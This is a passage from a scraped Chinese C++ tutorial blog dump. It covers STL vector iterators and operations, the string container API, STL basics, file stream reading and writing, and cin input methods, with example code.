目前本系列教程所用到的容器，都支持双向迭代器或随机访问迭代器，下面将会详细介绍这两个类别的迭代器。 9双向迭代器与随机访问迭代器 双向迭代器支持的操作： it++, ++it, it–, --it，*it， itA = itB， itA == itB，itA != itB ​ 其中list,set,multiset,map,multimap支持双向迭代器。 随机访问迭代器支持的操作： 在双向迭代器的操作基础上添加 it+=i， it-=i， it+i(或it=it+i)，it[i], itA&lt;itB, itA&lt;=itB, itA&gt;itB, itA&gt;=itB 的功能。 ​ 其中vector，deque支持随机访问迭代器。 10vector与迭代器的配合使用 12345678910111213vector&lt;int&gt; vecInt; //假设包含1,3,5,7,9元素vector&lt;int&gt;::iterator it; //声明容器vector&lt;int&gt;的迭代器。it = vecInt.begin(); // *it == 1++it; //或者it++; *it == 3 ，前++的效率比后++的效率高，前++返回引用，后++返回值。it += 2; //*it == 7it = it+1; //*it == 9++it; // it == vecInt.end(); 此时不能再执行*it,会出错! 正向遍历： 12345for(vector&lt;int&gt;::iterator it=vecInt.begin(); it!=vecInt.end(); ++it)&#123; int iItem = *it; cout &lt;&lt; iItem; //或直接使用 cout &lt;&lt; *it;&#125; 逆向遍历： 1234567for(vector&lt;int&gt;::reverse_iterator rit=vecInt.rbegin(); rit!=vecInt.rend(); ++rit) //注意，小括号内仍是++rit&#123; int iItem = *rit; cout &lt;&lt; iItem; //或直接使用cout &lt;&lt; *rit;&#125;此时将打印出9,7,5,3,1注意，这里迭代器的声明采用vector&lt;int&gt;::reverse_iterator，而非vector&lt;int&gt;::iterator。 迭代器还有其它两种声明方法： 1vector&lt;int&gt;::const_iterator 与 vector&lt;int&gt;::const_reverse_iterator 以上两种分别是vector&lt;int&gt;::iterator 与vector&lt;int&gt;::reverse_iterator 的只读形式，使用这两种迭代器时，不会修改到容器中的值。 备注：不过容器中的insert和erase方法仅接受这四种类型中的iterator，其它三种不支持。《Effective STL》建议我们尽量使用iterator取代const_iterator、reverse_iterator和const_reverse_iterator。 11vector的插入 123vector.insert(pos,elem); //在pos位置插入一个elem元素的拷贝，返回新数据的位置。vector.insert(pos,n,elem); //在pos位置插入n个elem数据，无返回值。vector.insert(pos,beg,end); //在pos位置插入[beg,end)区间的数据，无返回值 12345678910111213141516171819简单案例vector&lt;int&gt; vecA; vector&lt;int&gt; vecB; vecA.push_back(1); vecA.push_back(3); vecA.push_back(5); vecA.push_back(7); vecA.push_back(9); vecB.push_back(2); vecB.push_back(4); vecB.push_back(6); vecB.push_back(8); vecA.insert(vecA.begin(), 11); //&#123;11, 1, 3, 5, 7, 9&#125; vecA.insert(vecA.begin()+1,2,33); //&#123;11,33,33,1,3,5,7,9&#125; vecA.insert(vecA.begin() , vecB.begin() , vecB.end() ); //&#123;2,4,6,8,11,33,33,1,3,5,7,9&#125; 12vector的删除 1234理论知识vector.clear(); //移除容器的所有数据vec.erase(beg,end); //删除[beg,end)区间的数据，返回下一个数据的位置。vec.erase(pos); //删除pos位置的数据，返回下一个数据的位置。 123456789101112131415161718192021222324简单案例:删除区间内的元素vecInt是用vector&lt;int&gt;声明的容器，现已包含按顺序的1,3,5,6,9元素。vector&lt;int&gt;::iterator itBegin=vecInt.begin()+1;vector&lt;int&gt;::iterator itEnd=vecInt.begin()+2;vecInt.erase(itBegin,itEnd);//此时容器vecInt包含按顺序的1,6,9三个元素。假设 vecInt 包含1,3,2,3,3,3,4,3,5,3，删除容器中等于3的元素for(vector&lt;int&gt;::iterator it=vecInt.being(); it!=vecInt.end(); ) //小括号里不需写 ++it&#123; if(*it == 3) &#123; it = vecInt.erase(it); //以迭代器为参数，删除元素3，并把数据删除后的下一个元素位置返回给迭代器。 //此时，不执行 ++it； &#125; else &#123; ++it; &#125;&#125;//删除vecInt的所有元素vecInt.clear(); //容器为空 巧用swap收缩vector空间容量 12345678910111213141516171819202122232425262728#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;void test01() &#123; vector&lt;int&gt; vi; vi.resize(100,1); vi.reserve(1000); cout &lt;&lt; \"size: \" &lt;&lt; vi.size() &lt;&lt; endl; cout &lt;&lt; \"cap: \" &lt;&lt; vi.capacity() &lt;&lt; endl; cout &lt;&lt; \"=================================\" &lt;&lt; endl; vector&lt;int&gt;(vi).swap(vi); //先创建一个匿名对象,用vi的元素个数初始化,然后交换vi的ptr指针 cout &lt;&lt; \"size: \" &lt;&lt; vi.size() &lt;&lt; endl; cout &lt;&lt; \"cap: \" &lt;&lt; vi.capacity() &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125; reserve预留空间提高程序效率 123456789101112131415161718192021222324252627282930313233343536#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;void test02() &#123; vector&lt;int&gt; vi; int * pAddress = NULL; int num = 0; vi.reserve(100000); //如果提前知道了数据的个数,可以提前设置好容量的大小,避免频繁改动内存 for (int i = 0; i &lt; 100000; i++) &#123; vi.push_back(i); if (pAddress != &amp;vi[0]) &#123; pAddress = &amp;vi[0]; num++; &#125; &#125; cout.setf(ios::left); cout &lt;&lt;\"vi的内存变动了\" &lt;&lt; num &lt;&lt; \"次\" &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test02(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"STL的string容器","slug":"cpp0078-STL的string容器","date":"2021-06-29T04:18:51.000Z","updated":"2021-12-28T18:39:40.896Z","comments":true,"path":"2021/06/29/cpp0078-STL的string容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/29/cpp0078-STL的string容器/","excerpt":"","text":"STL的string容器 1String概念 string是STL的字符串类型，通常用来表示字符串。而在使用string之前，字符串通常是用char表示的。string与char都可以用来表示字符串，那么二者有什么区别呢。 string和char*的比较 string是一个类, char*是一个指向字符的指针。 string封装了char*，管理这个字符串，是一个char*型的容器。 string不用考虑内存释放和越界。 string管理char*所分配的内存。每一次string的复制，取值都由string类负责维护，不用担心复制越界和取值越界等。 string提供了一系列的字符串操作函数（这个等下会详讲） 查找find，拷贝copy，删除erase，替换replace，插入insert 2string的构造函数 默认构造函数： 1string(); //构造一个空的字符串string s1。 拷贝构造函数： 1string(const string &amp;str); //构造一个与str一样的string。如string s1(s2)。 带参数的构造函数 123string(const char *s); //用字符串s初始化string(int n,char c); //用n个字符c初始化 3string的存取字符操作 string类的字符操作： 1234567const char &amp;operator[] (int n) const;const char &amp;at(int n) const;char &amp;operator[] (int n);char &amp;at(int n); operator[]和at()均返回当前字符串中第n个字符，但二者是有区别的。 ​ 主要区别在于at()在越界时会抛出异常，[]在刚好越界时会返回(char)0，再继续越界时，编译器直接出错。如果你的程序希望可以通过try,catch捕获异常，建议采用at()。 4从string取得const char*的操作 1const char *c_str() const; //返回一个以&apos;\\0&apos;结尾的字符串的首地址 5把string拷贝到char*指向的内存空间的操作 1int copy(char *s, int n, int pos=0) const; 把当前串中以pos开始的n个字符拷贝到以s为起始位置的字符数组中，返回实际拷贝的数目。注意要保证s所指向的空间足够大以容纳当前字符串，不然会越界。 6string的长度 12int length() const; //返回当前字符串的长度。长度不包括字符串结尾的&apos;\\0&apos;。bool empty() const; //当前字符串是否为空 7string的赋值 1234567891011string &amp;operator=(const string &amp;s);//把字符串s赋给当前的字符串string &amp;assign(const char *s); //把字符串s赋给当前的字符串string &amp;assign(const char *s, int n); //把字符串s的前n个字符赋给当前的字符串string &amp;assign(const string &amp;s); //把字符串s赋给当前字符串string &amp;assign(int n,char c); //用n个字符c赋给当前字符串string &amp;assign(const string &amp;s,int start, int n); //把字符串s中从start开始的n个字符赋给当前字符串 8string字符串连接 12345678910111213string &amp;operator+=(const string &amp;s); //把字符串s连接到当前字符串结尾string &amp;operator+=(const char *s);//把字符串s连接到当前字符串结尾string &amp;append(const char *s); //把字符串s连接到当前字符串结尾string &amp;append(const char *s,int n); //把字符串s的前n个字符连接到当前字符串结尾string &amp;append(const string &amp;s); //同operator+=()string &amp;append(const string &amp;s,int pos, int n);//把字符串s中从pos开始的n个字符连接到当前字符串结尾string &amp;append(int n, char c); //在当前字符串结尾添加n个字符c 9string的比较 12int compare(const string &amp;s) const; //与字符串s比较int compare(const char *s) const; //与字符串s比较 compare函数在&gt;时返回 1，&lt;时返回 -1，==时返回 0。比较区分大小写，比较时参考字典顺序，排越前面的越小。大写的A比小写的a小。 10string的子串 1string substr(int pos=0, int n=npos) const; //返回由pos开始的n个字符组成的子字符串 11string的查找 和 替换 查找 1234567891011121314int find(char c,int pos=0) const; //从pos开始查找字符c在当前字符串的位置 int find(const char *s, int pos=0) const; //从pos开始查找字符串s在当前字符串的位置int find(const string &amp;s, int pos=0) const; //从pos开始查找字符串s在当前字符串中的位置find函数如果查找不到，就返回-1int rfind(char c, int pos=npos) const; //从pos开始从后向前查找字符c在当前字符串中的位置 int rfind(const char *s, int pos=npos) const;int rfind(const string &amp;s, int pos=npos) const;//rfind是反向查找的意思，如果查找不到， 返回-1 替换 12345string &amp;replace(int pos, int n, const char *s);//删除从pos开始的n个字符，然后在pos处插入串sstring &amp;replace(int pos, int n, const string &amp;s); //删除从pos开始的n个字符，然后在pos处插入串svoid swap(string &amp;s2); //交换当前字符串与s2的值 12String的区间删除和插入 123456string &amp;insert(int pos, const char *s);string &amp;insert(int pos, const string &amp;s);//前两个函数在pos位置插入字符串sstring &amp;insert(int pos, int n, char c); //在pos位置 插入n个字符cstring &amp;erase(int pos=0, int n=npos); //删除pos开始的n个字符，返回修改后的字符串 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;//char* 和 string转换void test01()&#123; //string类型转换为char*字符串 string s = \"abc\"; const char* str = s.c_str(); //char*类型字符串转换为string类型字符串 char* str2 = \"acbd\"; string s2(str2);&#125;//string初始化void test02()&#123; string s; //默认构造 string s2 = \"acbd\"; string s3(s2); string s4(10, 'c'); cout &lt;&lt; s2 &lt;&lt; endl; cout &lt;&lt; s3 &lt;&lt; endl; cout &lt;&lt; s4 &lt;&lt; endl;&#125;//string容器字符串赋值和存取void test03()&#123; //string容器赋值 string s; s = \"abcd\"; string s2; s2.assign(\"pppp\"); //string容器存取 string s3 = \"abcdefg\"; for (int i = 0; i &lt; s3.size();i++)&#123; cout &lt;&lt; s3[i] &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; for (int i = 0; i &lt; s3.size();i++)&#123; cout &lt;&lt; s3.at(i) &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; //【】访问方式访问越界时候，不会抛异常，直接挂掉 //at会抛出异常 try&#123; //cout &lt;&lt; s3[100] &lt;&lt; endl; cout &lt;&lt; s3.at(100) &lt;&lt; endl; &#125; catch (...)&#123; cout &lt;&lt; \"访问越界!\" &lt;&lt; endl; &#125;&#125;//string容器拼接操作void test04()&#123; string s1 = \"aaa\"; string s2 = \"bbb\"; //string s3 = s1 + s2; //cout &lt;&lt; s3 &lt;&lt; endl; //s1 += s2; //cout &lt;&lt; s1 &lt;&lt; endl; //成员方法方式 append s1.append(s2); cout &lt;&lt; s1 &lt;&lt; endl;&#125;//string查找和替换 比较void test05()&#123; string s = \" acbdefg\"; //查找 string target = \"bd\"; int pos = s.find(target); char* target2 = \"ef\"; int pos2 = s.find(target2); cout &lt;&lt; \"pos:\" &lt;&lt; pos &lt;&lt; endl; cout &lt;&lt; \"pos2:\" &lt;&lt; pos2 &lt;&lt; endl; int pos3 = s.rfind(target); cout &lt;&lt; \"pos3:\" &lt;&lt; pos3 &lt;&lt; endl; //字符串替换 string s1 = \"acbd\"; s.replace(0, 2, s1); cout &lt;&lt; s &lt;&lt; endl; &#125;//string 比较 子串 插入和删除void test06()&#123; //比较 string s1 = \"abc\"; string s2 = \"abd\"; int ret = s1.compare(s2); if (ret == 1)&#123; cout &lt;&lt; \"s1 &gt; s2\" &lt;&lt; endl; &#125; else if (ret == -1)&#123; cout &lt;&lt; \"s1 &lt; s2\" &lt;&lt; endl; &#125; else&#123; cout &lt;&lt; \"s1 == s2\" &lt;&lt; endl; &#125; //子串 string s3 = \"abcdefg\"; string s4 = s3.substr(0,2); cout &lt;&lt; \"s4\" &lt;&lt; s4 &lt;&lt; endl; //插入和删除 string s5 = \"abcd\"; s5.insert(0, \"pppp\"); string s6 = \"qqqq\"; s5.insert(s5.size(), s6); cout &lt;&lt; s5 &lt;&lt; endl; s5.erase(0,4); cout &lt;&lt; s5 &lt;&lt; endl; &#125;int main()&#123; //test02(); //test03(); //test04(); //test05(); test06(); system(\"pause\"); return EXIT_SUCCESS;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"STL基础理论","slug":"cpp0077-STL基础理论","date":"2021-06-29T03:39:14.000Z","updated":"2021-12-28T18:39:37.820Z","comments":true,"path":"2021/06/29/cpp0077-STL基础理论/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/29/cpp0077-STL基础理论/","excerpt":"","text":"STL实用技术专题 STL(标准模板库)理论基础 基本概念 STL（Standard Template Library，标准模板库)是惠普实验室开发的一系列软件的统称。现然主要出现在C中，但在被引入C之前该技术就已经存在了很长的一段时间。 STL的从广义上讲分为三类：algorithm（算法）、container（容器）和iterator（迭代器），容器和算法通过迭代器可以进行无缝地连接。几乎所有的代码都采 用了模板类和模板函数的方式，这相比于传统的由函数和类组成的库来说提供了更好的代码重用机会。在C++标准中，STL被组织为下面的13个头文 件：&lt;algorithm&gt;、&lt;deque&gt;、&lt;functional&gt;、&lt;iterator&gt;、&lt;vector&gt;、&lt;list&gt;、&lt;map&gt;、&lt;memory&gt;、&lt;numeric&gt;、&lt;queue&gt;、&lt;set&gt;、&lt;stack&gt; 和&lt;utility&gt;。 ​ STL详细的说六大组件 – 容器（Container） – 算法（Algorithm） – 迭代器（Iterator） – 仿函数（Function object） – 适配器（Adaptor） – 空间配制器（allocator） 使用STL的好处 1）STL是C++的一部分，因此不用额外安装什么，它被内建在你的编译器之内。 2）STL的一个重要特点是数据结构和算法的分离。尽管这是个简单的概念，但是这种分离确实使得STL变得非常通用。 例如，在STL的vector容器中，可以放入元素、基础数据类型变量、元素的地址； STL的sort()函数可以用来操作vector,list等容器。 1） 程序员可以不用思考STL具体的实现过程，只要能够熟练使用STL就OK了。这样他们就可以把精力放在程序开发的别的方面。 2） STL具有高可重用性，高性能，高移植性，跨平台的优点。 高可重用性：STL中几乎所有的代码都采用了模板类和模版函数的方式实现，这相比于传统的由函数和类组成的库来说提供了更好的代码重用机会。关于模板的知识，已经给大家介绍了。 高性能：如map可以高效地从十万条记录里面查找出指定的记录，因为map是采用红黑树的变体实现的。(红黑树是平横二叉树的一种) 高移植性：如在项目A上用STL编写的模块，可以直接移植到项目B上。 ​ 跨平台：如用windows的Visual Studio编写的代码可以在Mac OS的XCode上直接编译。 3） 程序员可以不用思考STL具体的实现过程，只要能够熟练使用STL就OK了。这样他们就可以把精力放在程序开发的别的方面。 4） 了解到STL的这些好处，我们知道STL无疑是最值得C程序员骄傲的一部分。每一个C＋＋程序员都应该好好学习STL。只有能够熟练使用STL的程序员，才是好的C程序员。 5） 总之：招聘工作中，经常遇到C程序员对STL不是非常了解。大多是有一个大致的映像，而对于在什么情况下应该使用哪个容器和算法都感到比较茫然。STL是C程序员的一项不可或缺的基本技能，掌握它对提升C++编程大有裨益。 容器 在实际的开发过程中，数据结构本身的重要性不会逊于操作于数据结构的算法的重要性，当程序中存在着对时间要求很高的部分时，数据结构的选择就显得更加重要。 经典的数据结构数量有限，但是我们常常重复着一些为了实现向量、链表等结构而编写的代码，这些代码都十分相似，只是为了适应不同数据的变化而在 细节上有所出入。STL容器就为我们提供了这样的方便，它允许我们重复利用已有的实现构造自己的特定类型下的数据结构，通过设置一些模板，STL容器对最常用的数据结构提供了支持，这些模板的参数允许我们指定容器中元素的数据类型，可以将我们许多重复而乏味的工作简化。 容器部分主要由头文 件&lt;vector&gt;,&lt;list&gt;,&lt;deque&gt;,&lt;set&gt;,&lt;map&gt;,&lt;stack&gt; 和&lt;queue&gt;组成。对于常用的一些容器和容器适配器（可以看作由其它容器实现的容器），可以通过下表总结一下它们和相应头文件的对应关系。 容器的概念 用来管理一组元素 容器的分类 序列式容器（Sequence containers） 每个元素都有固定位置－－取决于插入时机和地点，和元素值无关。 vector、deque、list 关联式容器（Associated containers） 元素位置取决于特定的排序准则，和插入顺序无关 set、multiset、map、multimap 迭代器 迭代器从作用上来说是最基本的部分，可是理解起来比前两者都要费力一些。软件设计有一个基本原则，所有的问题都可以通过引进一个间接层来简化， 这种简化在STL中就是用迭代器来完成的。概括来说，迭代器在STL中用来将算法和容器联系起来，起着一种黏和剂的作用。几乎STL提供的所有算法都是通 过迭代器存取元素序列进行工作的，每一个容器都定义了其本身所专有的迭代器，用以存取容器中的元素。 迭代器部分主要由头文件&lt;utility&gt;,&lt;iterator&gt;和&lt;memory&gt;组 成。&lt;utility&gt;是一个很小的头文件，它包括了贯穿使用在STL中的几个模板的声明，&lt;iterator&gt;中提供了迭代器 使用的许多方法，而对于&lt;memory&gt;的描述则十分的困难，它以不同寻常的方式为容器中的元素分配存储空间，同时也为某些算法执行期间产生 的临时对象提供机制,&lt;memory&gt;中的主要部分是模板类allocator，它负责产生所有容器中的默认分配器。 算法 函数库对数据类型的选择对其可重用性起着至关重要的作用。举例来说，一个求方根的函数，在使用浮点数作为其参数类型的情况下的可重用性肯定比使 用整型作为它的参数类性要高。而C++通过模板的机制允许推迟对某些类型的选择，直到真正想使用模板或者说对模板进行特化的时候，STL就利用了这一点提 供了相当多的有用算法。它是在一个有效的框架中完成这些算法的——可以将所有的类型划分为少数的几类，然后就可以在模版的参数中使用一种类型替换掉同一种 类中的其他类型。 STL提供了大约100个实现算法的模版函数，比如算法for_each将为指定序列中的每一个元素调用指定的函数，stable_sort以 你所指定的规则对序列进行稳定性排序等等。这样一来，只要熟悉了STL之后，许多代码可以被大大的化简，只需要通过调用一两个算法模板，就可以完成所需要 的功能并大大地提升效率。 算法部分主要由头文件&lt;algorithm&gt;，&lt;numeric&gt;和&lt;functional&gt;组 成。&lt;algorithm&gt;是所有STL头文件中最大的一个（尽管它很好理解），它是由一大堆模版函数组成的，可以认为每个函数在很大程度上 都是独立的，其中常用到的功能范围涉及到比较、交换、查找、遍历操作、复制、修改、移除、反转、排序、合并等等。&lt;numeric&gt;体积很 小，只包括几个在序列上面进行简单数学运算的模板函数，包括加法和乘法在序列上的一些操作。&lt;functional&gt;中则定义了一些模板类， 用以声明函数对象。 C++标准库 C强大的功能来源于其丰富的类库及库函数资源。C标准库的内容总共在50个标准头文件中定义。在C++开发中，要尽可能地利用标准库完 成。这样做的直接好处包括：（1）成本：已经作为标准提供，何苦再花费时间、人力重新开发呢；（2）质量：标准库的都是经过严格测试的，正确性有保证； （3）效率：关于人的效率已经体现在成本中了，关于代码的执行效率要相信实现标准库的大牛们的水平；（4）良好的编程风格：采用行业中普遍的做法进行开发。 在C++程序设计课程中，尤其是作为第一门程序设计课程，我们注重了语法、语言的机制等方面的内容。程序设计能力的培养有个过程，跨过基本的原 理性知识直接进入到工程 中的普遍做法，由于跨度决定了其难度。再者，在掌握了基本原理的基础上，在认识标准库的问题上完全可以凭借实践，逐步地掌握。标准 库的学习不需要认认真真地读书，需要的是在了解概貌的情况下，在实践中深入。 这个任务就是要知道C++程序设计课程中不讲的，但对程序设计又很重要的这部分内容。至少我们要能先回答出“有什么”的问题。 C++标准库的内容分为10类，分别是（建议在阅读中，将你已经用过或听说过的头文件划出来）： C1. 标准库中与语言支持功能相关的头文件 C2. 支持流输入/输出的头文件 C标准库的所有头文件都没有扩展名。C标准库以&lt;cname&gt;形式的标准头文件提供。在 &lt;cname&gt;形式标准的头文件中，与宏相关的名称在全局作用域中定义，其他名称在std命名空间中声明。在C++中还可以使用name.h 形式的标准C库头文件名","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"文件操作","slug":"cpp0076-文件操作","date":"2021-06-29T01:27:59.000Z","updated":"2021-12-28T18:39:33.742Z","comments":true,"path":"2021/06/29/cpp0076-文件操作/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/29/cpp0076-文件操作/","excerpt":"","text":"文本文件操作 ifstream类，它是从istream类派生的，用来支持从磁盘文件的输入。 ofstream类，它是从ostream类派生的，用来支持向磁盘文件的输出。 fstream类，它是从iostream类派生的，用来支持对磁盘文件的输入输出。 文件的打开与关闭 打开文件 所谓打开(open)文件是一种形象的说法，如同打开房门就可以进入房间活 动一样。 打开文件是指在文件读写之前做必要的准备工作，包括： 1）为文件流对象和指定的磁盘文件建立关联，以便使文件流流向指定的磁盘 文件。 2）指定文件的工作方式，如，该文件是作为输入文件还是输出文件，是ASCII 文件还是二进制文件等。 以上工作可以通过两种不同的方法实现。 调用文件流的成员函数open。如 ofstream outfile; //定义ofstream类(输出文件流类)对象outfile outfile.open(“f1.dat”,ios::out); //使文件流与f1.dat文件建立关联 第2行是调用输出文件流的成员函数open打开磁盘文件f1.dat，并指定它为输出 文件， 文件流对象ouFile将向磁盘文件f1.dat输出数据。ios::out是I/O模式的一 种，表示以输出方式打开一个文件。或者简单地说，此时f1.dat是一个输出文 件，接收从内存输出的数据。 调用成员函数open的一般形式为： 文件流对象.open(磁盘文件名, 输入输出方式); 磁盘文件名可以包括路径，如&quot;c:\\new\\f1.dat&quot;，如缺省路径，则默认为当 前目录下的文件。 在定义文件流对象时指定参数 在声明文件流类时定义了带参数的构造函数，其中包含了打开磁盘文件 的功能。因此，可以在定义文件流对象时指定参数，调用文件流类的构造函数 几点说明： 新版本的I/O类库中不提供ios::nocreate和ios::noreplace。 每一个打开的文件都有一个文件指针，该指针的初始位置由I/O方式指定， 每次读写都从文件指针的当前位置开始。每读入一个字节，指针就后移一个字 节。当文 件指针移到最后，就会遇到文件结束EOF（文件结束符也占一个字节， 其值为-1)，此时流对象的成员函数eof的值为非0值(一般设为1)，表示文件结 束 了。 可以用“位或”运算符“|”对输入输出方式进行组合，如表13.6中最后3行 所示那样。还可以举出下面一些例子： ios::in | ios:: noreplace //打开一个输入文件，若文件不存在则返回打开失 败的信息 ios::app | ios::nocreate //打开一个输出文件，在文件尾接着写数据，若文件不存在，则返回打开失败的信息 ios::out l ios::noreplace //打开一个新文件作为输出文件，如果文件已存 在则返回打开失败的信息 ios::in l ios::out I ios::binary //打开一个二进制文件，可读可写 但不能组合互相排斥的方式，如 ios::nocreate l ios::noreplace。 如果打开操作失败，open函数的返回值为0(假)，如果是用调用构造函数的 方式打开文件的，则流对象的值为0。可以据此测试打开是否成功。如 if(outfile.open(“f1.bat”, ios::app) ==0) cout &lt;&lt;“open error”; 或 if( !outfile.open(“f1.bat”, ios::app) ) cout &lt;&lt;“open error”; 关闭文件 在对已打开的磁盘文件的读写操作完成后，应关闭该文件。关闭文件用 成员函数close。如 ouFile.close(); //将输出文件流所关联的磁盘文件关闭 所谓关闭，实际上是解除该磁盘文件与文件流的关联，原来设置的工作方式也 失效，这样，就不能再通过文件流对该文件进行输入或输出。此时可以将文件 流与其他磁盘文件建立关联，通过文件流对新的文件进行输入或输出。如 ouFile.open(“f2.dat”,ios::app|ios::nocreate); 此时文件流ouFile与f2.dat建立关联，并指定了f2.dat的工作方式。 C++对ASCII文件的读写操作 如果文件的每一个字节中均以ASCII代码形式存放数据,即一个字节存放一 个字符,这个文件就是ASCII文件(或称字符文件)。程序可以从ASCII文件中读入若 干个字符,也可以向它输出一些字符。 用流插入运算符&lt;&lt;和流提取运算符&gt;&gt;输入输出标准类型的数据。&lt;&lt; 和&gt;&gt;都已在iostream中被重载为能用于ostream和istream类对象的标准类型的 输入输出。由于ifstream和 ofstream分别是ostream和istream类的派生类；因此 它们从ostream和istream类继承了公用的重载函数，所以在对磁盘文件的操作 中，可以通过文件流对象和流插入运算符&lt;&lt;及 流提取运算符&gt;&gt;实现对磁盘 文件的读写，如同用cin、cout和&lt;&lt;、&gt;&gt;对标准设备进行读写一样。 用文件流的put、get、geiline等成员函数进行字符的输入输出，：用C++ 流成员函数put输出单个字符、C++ get()函数读入一个字符和C++ getline()函数读 入一行字符。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;fstream&gt;using namespace std;void test01() &#123; char sourceFileName[] = \"source.txt\"; char destFileName[] = \"dest.txt\"; //方式1 //用构造函数打开文件 //ifstream fin(sourceFileName,ios::in); //打开输入文件 //ofstream fout(destFileName,ios::out); //打开输出文件 //方式2 ifstream fin; ofstream fout; fin.open(sourceFileName,ios::in); //以写追加模式打开文件 fout.open(destFileName,ios::out | ios::app); //判断文件是否打开成功 //这里 if (!fin || !fout) &#123; cout &lt;&lt; \"打开文件失败\" &lt;&lt; endl; return; &#125; char ch; while (fin.get(ch)) &#123; fout &lt;&lt; ch; //fout.put(ch); //输出一个字符到文件里 &#125; //关闭文件 fin.close(); fout.close();&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125; C++对二进制文件的读写操作 文本模式 在linux系统平台下是以\\n作为换行符的 在windows系统平台下是以\\r\\n作为换行符 文本模式和二进制模式在Linux下是不区分的,但在windows模式下是区分的,因为windows模式下的换行符\\r\\n要进行转换 二进制模式 不进行编码转换,将内存中的内容原封不动的输出到文件或将内容原封不动的输入到内存中 1.用ios::binary模式打开文件 2.以二进制方式写到文件 ​ 对象名.write(地址,要写入的字节大小) 3.以二进制方式读到内存 ​ 对象名.read(地址,要读入的字节大小) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;fstream&gt;using namespace std;class Person &#123;public: Person() &#123; m_Age = 0; strcpy(m_Name,\"\"); &#125; Person(const char * name, int age) &#123; m_Age = age; strcpy(m_Name, name); &#125; void show() &#123; cout &lt;&lt; m_Name &lt;&lt; \" \" &lt;&lt; m_Age &lt;&lt; endl; &#125; int m_Age; char m_Name[50];&#125;;void test01() &#123; Person p1(\"小明\", 18); Person p2(\"小花\", 16); char fileName[] = \"binary.txt\"; //以二进制方式打开文件 ofstream fout(fileName, ios::out | ios::binary); ifstream fin(fileName, ios::in | ios::binary); if (!fin || !fout) &#123; cout &lt;&lt; \"文件打开失败\" &lt;&lt; endl; return; &#125; //写二进制文件,首位参数需要转换类型为char * fout.write((char *) &amp;p1,sizeof(p1)); fout.write((char *) &amp;p2,sizeof(p2)); fout.close(); Person tP1, tP2; //读二进制文件,首位参数需要转换类型为char * fin.read((char *)&amp;tP1,sizeof(tP1)); fin.read((char *)&amp;tP2,sizeof(tP2)); //显示输出 tP1.show(); tP2.show(); fin.close();&#125;int main(char *argv[], int argc)&#123; test01(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"标准输入输出","slug":"cpp0075-标准输入输出","date":"2021-06-28T04:14:14.000Z","updated":"2021-12-28T18:39:27.353Z","comments":true,"path":"2021/06/28/cpp0075-标准输入输出/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/28/cpp0075-标准输入输出/","excerpt":"","text":"标准输入输出 缓冲区 1234567有缓冲区的输入输出对象cout //标准输出cin //标准输入clog //打印日志没有缓冲区的输出对象cerr //标准出错 标准输入流 常用的cin成员方法 12345678910111213141516ch 代表字符变量buff 代表字符数组size代表字符数组长度cin.get() //一次只能读取一个字符cin.get(ch) //读一个字符cin.get(buff,size) //可以读字符串cin.getline(buff,size)//输入一行cin.ignore() //从缓冲区取走一个字符并丢弃cin.ignore(2) //从缓冲区取走2个字符并丢弃cin.ignore(2,&apos;\\n&apos;) //从缓冲区取走2个字符并丢弃,遇到\\n提前结束cin.peek();//偷窥缓冲区内容,返回缓冲区第一个字符,不取走字符cin.putback(ch) //把ch放回缓冲区 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//cin的operator&gt;&gt;操作符 //根据回车来刷新缓冲区 根据空格来隔离每个变量的内容void test1()&#123; int myInt; long myLong; char buf[128] = &#123; 0 &#125;; cin &gt;&gt; myInt; cin &gt;&gt; myLong; cin &gt;&gt; buf; cout &lt;&lt; \"myInt: \" &lt;&lt; myInt &lt;&lt; endl; cout &lt;&lt; \"myLong: \" &lt;&lt; myLong &lt;&lt; endl; cout &lt;&lt; \"buf: \" &lt;&lt; buf &lt;&lt; endl;&#125;//cin.get()方法void test2()&#123; char ch; //cin.get()如果读到的不是EOF标识符，那么会永远的阻塞等待 //从键盘来讲ctrl+z 代表EOF标识符 while ((ch = cin.get() )!= EOF) &#123; cout &lt;&lt; ch &lt;&lt; endl; &#125;&#125;void test3()&#123; char a, b, c; char buf[10] = &#123; 0 &#125;; cout &lt;&lt; \"从输入缓冲区去读取数据，如果缓冲区中没有数据，就阻塞\" &lt;&lt; endl; //cin.get(a); //从输入缓冲区去读取数据，如果有就给a //cin.get(b); //cin.get(c); //cin.get(a).get(b).get(c); //cout &lt;&lt; \"a =\" &lt;&lt; a &lt;&lt; endl; //cout &lt;&lt; \"b =\" &lt;&lt; b&lt;&lt; endl; 